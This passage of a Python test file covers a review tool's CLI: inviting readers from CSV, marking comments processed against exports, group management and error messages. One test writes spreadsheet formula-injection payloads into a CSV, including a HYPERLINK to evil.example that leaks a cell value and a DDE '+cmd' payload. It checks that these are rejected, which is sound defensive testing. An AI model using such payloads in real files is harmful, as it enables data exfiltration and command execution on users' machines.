            code, _, err = self.cli("invite", "--from", str(folder / "head.csv"), ok=False)
            self.assertIn("must start with the line: name,groups,grants,english", err)
            self.assertIn(why, err)
        bad = folder / "bad.csv"
        bad.write_text('name,grants,email\n=HYPERLINK("https://evil.example/?l="&B3),SC98,a\n'
                       "Formula Cell,SC98,=1+1\nAt Cell,SC98,@SUM(1)\nPlus Cell,SC98,+cmd|' /C calc'!A0\n")
        code, _, err = self.cli("invite", "--from", str(bad), ok=False)
        self.assertIn("Line 2: the name =HYPERLINK", err)
        for line in (3, 4, 5):
            self.assertIn(f"Line {line}: ", err)
        self.assertIn("which a spreadsheet may run as a formula", err)
        self.assertNotIn("Formula Cell", self.cli("readers", "--name", "cell")[1])

    def test_processed_needs_the_export_the_markers_came_from(self):
        self.put_chapter(96)
        code = self.invite("Anan Export96", "SC96")
        ids = []
        for i in range(2):
            status, body, _ = http("POST", f"{self.url}/api/comments", code, {
                "client_id": f"p96-{i}", "book": "SC", "ch": "SC96", "a": "SC 196.1", "kind": "flag", "quote": "",
                "text": f"First words {i}"})
            ids.append(body["id"])
        folder = Path(self.tmp.name) / "exports96"
        self.cli("export", "--ch", "SC96", "--out", str(folder / "a.json"))
        http("PATCH", f"{self.url}/api/comments/{ids[0]}", code, {"text": "Changed words"})
        self.cli("export", "--reader", "Anan Export96", "--out", str(folder / "b.json"))
        code_, out, err = self.cli("processed", str(ids[0]), str(ids[1]), "--export", str(folder), ok=False)
        self.assertEqual(code_, 1)
        self.assertIn("1 comment marked processed.", out)
        self.assertIn(f"Changed by the reader between exports, so not marked: {ids[0]}.", err)
        self.assertIn("a.json, b.json", err)
        self.assertIn("--export FILE", err)
        # The export the markers came from holds the old words, so the comment stays open.
        code_, out, err = self.cli("processed", str(ids[0]), "--export", str(folder / "a.json"), ok=False)
        self.assertIn(f"Changed by the reader since the export, so not marked: {ids[0]}.", err)
        _, out, _ = self.cli("processed", str(ids[0]), "--export", str(folder / "b.json"))
        self.assertIn("1 comment marked processed.", out)
        # Many ids go in batches; only the ids asked for are kept from the exports.
        calls = []
        real = review.Client.call

        def counting(client, method, path, *args, **kw):
            calls.append(path)
            return real(client, method, path, *args, **kw)

        with mock.patch.object(review, "BATCH", 1), mock.patch.object(review.Client, "call", counting):
            _, out, _ = self.cli("processed", "--undo", str(ids[0]), str(ids[1]))
        self.assertIn("2 comments marked not processed.", out)
        self.assertEqual(calls.count("/api/admin/processed"), 2)
        self.assertEqual(set(review.export_revs(folder, self.url, [ids[1]])), {ids[1]})

    def test_relink_of_a_group_asks_for_the_count(self):
        self.cli("group", "create", "Relink99")
        for i in range(2):
            self.invite(f"Relink Reader {i}", "SC99")
        self.cli("group", "add", "Relink99", "Relink Reader 0", "Relink Reader 1")
        with mock.patch("sys.stdin", io.StringIO("3\n")):
            code, _, err = self.cli("relink", "--group", "Relink99", ok=False)
        self.assertIn("This gives 2 readers of Relink99 new links", err)
        self.assertIn("Nothing was changed.", err)
        with mock.patch("sys.stdin", io.StringIO("")):
            code, _, err = self.cli("relink", "--group", "Relink99", ok=False)
        self.assertIn("Pass --yes", err)
        with mock.patch("sys.stdin", io.StringIO("2\n")):
            _, out, _ = self.cli("relink", "--group", "Relink99")
        self.assertIn("2 readers of Relink99 have new links", out)

    def test_group_add_says_what_changed_and_reads_a_file(self):
        self.cli("group", "create", "Members89")
        for name in ("Mem A89", "Mem B89"):
            self.invite(name, "SC89")
        _, out, _ = self.cli("group", "add", "Members89", "Mem A89")
        self.assertIn("1 reader added to Members89. It has 1 member.", out)
        _, out, _ = self.cli("group", "add", "Members89", "mem a89")
        self.assertIn("0 readers added to Members89. It has 1 member.", out)
        self.assertIn("Not changed, because already members: Mem A89.", out)
        f = Path(self.tmp.name) / "members89.csv"
        f.write_text("email,Name\nx@example.org,Mem A89\ny@example.org,Mem B89\n")
        _, out, _ = self.cli("group", "take-out", "Members89", "--from", str(f))
        self.assertIn("1 reader taken out of Members89. It has 0 members.", out)
        self.assertIn("Not changed, because not members: Mem B89.", out)
        _, out, _ = self.cli("group", "add", "Members89", "--from", str(f))
        self.assertIn("2 readers added to Members89.", out)
        f.write_text("name\nNobody Here89\n")
        code, _, err = self.cli("group", "add", "Members89", "--from", str(f), ok=False)
        self.assertIn("No reader named Nobody Here89; nothing changed.", err)

    def test_readers_by_part_of_a_name_and_by_link(self):
        self.put_chapter(88)
        code = self.invite("Findable Person88", "SC88")
        self.invite("Other Person88", "SC88")
        _, out, _ = self.cli("readers", "--name", "findable")
        self.assertIn("Findable Person88: active;", out)
        self.assertNotIn("Other Person88", out)
        self.assertRegex(out, r"\n1 of \d+ readers\.\n$")
        _, out, _ = self.cli("readers", "--link", f"https://review.example.org/#k={code}")
        self.assertIn("Findable Person88: active;", out)
        self.assertNotIn("Other Person88", out)
        code_, _, err = self.cli("readers", "--link", "https://review.example.org/", ok=False)
        self.assertIn("Cannot find a code in that link", err)

    # ---------- errors ----------

    def test_server_down_and_bad_token(self):
        port = free_port(8099)
        code, _, err = self.run_cli("--server", f"http://127.0.0.1:{port}", "--token-file", str(self.token),
                                    "chapters")
        self.assertEqual(code, 1)
        self.assertIn("Cannot reach the server", err)
        bad = Path(self.tmp.name) / "bad-token"
        bad.write_text("x" * 43)
        code, _, err = self.run_cli("--server", self.url, "--token-file", str(bad), "readers")
        self.assertIn("401", err)
        code, _, err = self.run_cli("--server", self.url, "--token-file", str(bad) + ".none", "readers")
        self.assertIn("Cannot read the admin token file", err)

    def test_help_lists_every_command(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit):
            review.main(["--help"])
        for name in ("setup", "serve", "backup", "publish", "withdraw", "chapters", "invite", "readers", "grant",
                     "ungrant", "revoke", "restore", "english", "feature", "features", "relink", "groups", "group",
                     "export", "processed"):
            self.assertIn(name, out.getvalue())


if __name__ == "__main__":
    unittest.main()
